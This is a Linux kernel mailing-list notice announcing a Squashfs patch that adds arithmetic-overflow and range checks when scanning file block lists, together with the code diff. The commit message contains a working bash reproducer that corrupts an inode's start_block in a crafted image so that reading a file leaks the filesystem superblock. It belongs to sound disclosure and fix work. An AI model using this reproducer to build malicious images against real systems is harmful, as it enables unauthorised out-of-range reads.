Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795407273;
	b=t+A5uJ5UXiSwPJuaOvzh1OgrJTre9xwVJNlXhF1MG3bznNv2l6jC5t7aFKwHiZ98tNlP
	 NUNbyuM3EKf0Tdb7rMnD8b3Dastx6AydeFOij/g18WkiQixPq41f+WzdY1dVM4h0zvEIv
	 Z5cdYss4TgVPpSKXuYPnsrG4Rxk45lgYupFM4acsLa2sG0jAyg0P3QDn1VCLS5aCMDXeN
	 htSdPD1RqQq9Bg7VV6KvfIn6iEB2oqEUPwRoj3QC+GpHYa4NgYXqZEKwzIvrdMzL8rm9X
	 169XOiHc1sYb91jK8tc28HmPjwsYYlVmiDpg2j0HEZMbFD0gJAJMAL2CGPE8xJOMoTw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795407273;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=zjc4M7JBuD4WYL2KcZwvu7RZ9VfysSwLIySUHKh8+Jk=;
	b=REsBsFK4LZh6Q/cO74GFOZ8qIs7oio9pL73LKUn4Ftg3xk5tLYe1epbgZ6voR3K4LwbY
	 UlF5cFS06+55XnYYck+ZXUHJgyG+QCCyiIpVIhirA1Gv/J+4FcLKqy6B4fOSwI6Vi7hWn
	 5Qm5eyVRYIwAPqoVakOS3vKQqG4YDRwxzU1YOJgUjC2NrKeRWPXiQfxPUeSyhxAjjAMG/
	 mpPwsYur5XKC5alvBztI416bN3Qrzne3aP2bk7U7Tabxe5OnysNxvWzXNhGAseHSprKkd
	 EGI3hL592l0vW9dMD290HKB2KeOoInBLqUf26RisMYjjXadPFYw7J7WRhza3h7uxkEA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=IPnVAwLl;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E78C1606A31E
	for <mm-commits@vger.kernel.org>; Mon, 23 Nov 2026 04:14:32 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=IPnVAwLl
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 73AB41F000C6;
	Mon, 23 Nov 2026 04:14:32 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795407272;
	bh=zjc4M7JBuD4WYL2KcZwvu7RZ9VfysSwLIySUHKh8+Jk=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=IPnVAwLlMWFpbR6V9I16GZ6b2oXjz1DRNhRrn5rGvFAlp66Z4SlYvTZf/aPbC7MY8
	 U1DqueS5IwqcKi1wU6Nr6iXHVj86RkpUo2HPUvDQDfWAWoI3O3bWIhCoBLwg4YOAg+
	 IvE5VfJKIPYQDrzsxuTN0iTK9+gt0ZAs19VS23RY=
Date: Sun, 22 Nov 2026 20:14:31 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261123034304.261742-18-phillip@squashfs.org.uk>
References: <20261123034304.261742-18-phillip@squashfs.org.uk>
Subject: + squashfs-sanity-check-block-list-sizes-and-range.patch added to mm-nonmm-unstable branch
Message-Id: <20261123041432.73AB41F000C6@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: sanity check block list sizes and range
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-sanity-check-block-list-sizes-and-range.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-block-list-sizes-and-range.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check block list sizes and range
Date: Mon, 23 Nov 2026 03:42:58 +0000

A Squashfs file has a list of block sizes, storing the compressed size
of each data block.  This block list is scanned to discover the size and
location of block x, where the sizes of previous data blocks are added
to the start of the data blocks to produce the location.

But, when scanning this block list and adding the block sizes, the code
does not check for arithmetic overflow.  This means the data block start
location can be crafted to be close to 2^64, and so the addition of the
block sizes can cause arithmetic overflow and thereby evade any sanity
checks.

Additionally, the range (start and end) of the data block that is to be
read from the filesystem is not checked for correctness before
squasfs_read_data().

This commit adds checks for arithmetic overflow and sanity checks the
range of the data block before attempting to read from disk.

Reproducer
==========

The reproducer generates a Squashfs filesystem with a file with two
data blocks, and then corrupts the location of the start of the data
blocks to 2^64 - 128 KiB.  This added to the size of data block 0 (128
KiB) will overflow, producing a location of 0.  If the exploit succeeds,
when the second block is read, Squashfs will not produce an I/O error
and instead print the Squashfs filesystem superblock starting with hsqs.

====================================================================
#!/bin/bash

ARGS="-quiet -no-progress -noI -noD -no-sparse -no-fragments -comp gzip"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo "Create Squashfs filesystem with one file, with 2 data blocks"
echo "Create a hard link to it, to force Mksquashfs to use an extended inode"
echo "(more than one nlink).  This means the start_block field will"
echo "be 64-bits"

echo "/ d 0777 0 0" > pseudo
echo "zero f 0777 0 0 dd if=/dev/zero bs=1024 count=256 2>/dev/null" >> pseudo
echo "hardlink L zero" >> pseudo

if ! mksquashfs - img.sqsh -pf pseudo $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

echo "Corrupt the start_block field of file zero's inode, which"
echo "points to the start of the file's data blocks."
echo "Alter it to the value 0xFFFFFFFFFFFE0000 (2^64 - 128 KiB)."
echo "That value added to the size of the first data block (128 KiB)"
echo "will overflow"
echo "The inode start_block field is stored at byte offset 262258"

/usr/bin/echo -en "\x00\x00\xfe\xff\xff\xff\xff\xff" > file
dd if=file of=img.sqsh seek=262258 bs=1 count=8 conv=notrunc status=none

echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the file zero.
echo If the exploit succeeds, dd will not fail, and it will display the Squashfs
echo superblock, beginning with hsqs
echo

dd if=/mnt/zero bs=1024 skip=128

popd 2>&1> /dev/null

rm -rf $DIR
====================================================================

Link: https://patch.msgid.link/20261123034304.261742-18-phillip@squashfs.org.uk
Fixes: 1701aecb6849 ("Squashfs: regular file operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
Cc: Christian Loehle <christian.loehle@arm.com>
Cc: Dan Carpenter <error27@gmail.com>
Cc: Phillip Lougher <phillip.lougher@gmail.com>
Cc: syzbot ci <syzbot+ci04e7314748e3f6be@syzkaller.appspotmail.com>

 fs/squashfs/cache.c            |    2 +-
 fs/squashfs/file.c             |   27 +++++++++++++++++++++------
 fs/squashfs/squashfs_helpers.h |   20 +++++++++++++++++---
 3 files changed, 39 insertions(+), 10 deletions(-)

--- a/fs/squashfs/cache.c~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/cache.c
@@ -490,7 +490,7 @@ struct squashfs_cache_entry *squashfs_ge
 				u64 start_block, int length)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int res = squashfs_check_range(start_block, length, msblk);
+	int res = squashfs_check_range(start_block, squashfs_frag_size(length, msblk->block_size), msblk);
 
 	if (res < 0)
 		return ERR_PTR(res);
--- a/fs/squashfs/file.c~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/file.c
@@ -281,6 +281,9 @@ static s64 fill_meta_index(struct inode
 			long long res = read_indexes(inode->i_sb, blocks,
 					&cur_index_block, &cur_offset);
 
+			if (res >= 0)
+				res = squashfs_add_indexes(cur_data_block, res, msblk);
+
 			if (res < 0) {
 				if (meta->entries == 0)
 					/*
@@ -292,7 +295,7 @@ static s64 fill_meta_index(struct inode
 				goto failed;
 			}
 
-			cur_data_block += res;
+			cur_data_block = res;
 			meta_entry = &meta->meta_entry[i - meta->offset];
 			meta_entry->index_block = cur_index_block -
 				msblk->inode_table;
@@ -353,8 +356,13 @@ static int read_blocklist_ptrs(struct in
 		blks = read_indexes(inode->i_sb, index - res, start, offset);
 		if (blks < 0)
 			return (int) blks;
-		if (block)
-			*block += blks;
+		if (block) {
+			res = squashfs_add_indexes(*block, blks, msblk);
+			if (res < 0)
+				return (int) res;
+
+			*block = res;
+		}
 	}
 
 	/*
@@ -492,8 +500,11 @@ static int squashfs_read_folio(struct fi
 
 		if (res == 0)
 			res = squashfs_readpage_sparse(folio, expected);
-		else
-			res = squashfs_readpage_block(folio, block, res, expected);
+		else {
+			res = squashfs_check_range(block, res, msblk);
+			if (res >= 0)
+				res = squashfs_readpage_block(folio, block, res, expected);
+		}
 	} else
 		res = squashfs_readpage_fragment(folio, expected);
 
@@ -629,7 +640,11 @@ static void squashfs_readahead(struct re
 		}
 
 		bsize = read_blocklist(inode, start >> msblk->block_log, &block);
-		if (bsize == 0)
+		if (bsize <= 0)
+			goto skip_pages;
+
+		bsize = squashfs_check_range(block, bsize, msblk);
+		if (bsize < 0)
 			goto skip_pages;
 
 		actor = squashfs_page_actor_init_special(msblk, pages, nr_pages,
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/squashfs_helpers.h
@@ -240,10 +240,8 @@ static inline int squashfs_frag_size(u32
 	return size;
 }
 
-static inline int squashfs_check_range(u64 start_block, s32 disk_size, struct squashfs_sb_info *msblk)
+static inline int squashfs_check_range(u64 start_block, s32 size, struct squashfs_sb_info *msblk)
 {
-	int size = squashfs_frag_size(disk_size, msblk->block_size);
-
 	if (size < 0)
 		return size;
 
@@ -259,4 +257,20 @@ static inline int squashfs_check_range(u
 
 	return size;
 }
+
+static inline s64 squashfs_add_indexes(u64 block, s64 blks, struct squashfs_sb_info *msblk)
+{
+
+	if (block > S64_MAX)
+		return -EIO;
+
+	/*
+	 * the above check ensured block is not 2^63 or larger, and so
+	 * this addition will not overflow
+	 */
+	if (block + blks > msblk->inode_table)
+		return -EIO;
+
+	return block + blks;
+}
 #endif
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

